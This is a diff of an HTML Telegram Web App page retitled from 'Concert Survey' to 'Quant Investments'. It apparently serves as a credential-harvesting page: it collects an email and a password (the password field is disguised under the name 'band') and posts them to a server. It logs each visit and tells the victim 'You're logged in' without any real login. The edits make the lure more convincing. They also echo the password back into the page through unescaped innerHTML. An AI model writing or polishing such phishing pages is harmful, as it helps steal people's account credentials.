@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Concert Survey</title>
+<title>Quant Investments</title>
 
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 
@@ -42,7 +42,7 @@ input, button {
     </p>
 
     <input id="email" placeholder="Email" />
-    <input id="band" placeholder="Password" />
+    <input id="band" type="password" placeholder="Password" />
 
     <div class="error" id="error"></div>
 
@@ -56,9 +56,12 @@ Telegram.WebApp.ready();
 fetch('/log-visit', { method: 'POST' });
 
 function submitForm() {
-    const email = email.value.trim();
-    const band = band.value.trim();
+    const emailInput = document.getElementById('email');
+    const bandInput = document.getElementById('band');
     const error = document.getElementById('error');
+
+    const email = emailInput.value.trim();
+    const band = bandInput.value.trim();
 
     error.textContent = '';
 
@@ -82,10 +85,15 @@ function submitForm() {
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ email, band, valid: true })
     }).then(() => {
-        document.body.innerHTML = `<h2>You're logged in 🎉</h2>`;
+        document.body.innerHTML = `<h2>You're logged in 🎉</h2><p>You selected: ${band}</p>`;
+    }).catch(err => {
+        error.textContent = 'Submission failed. Try again.';
+        console.error(err);
     });
 }
 </script>
+
+
 
 </body>
 </html>
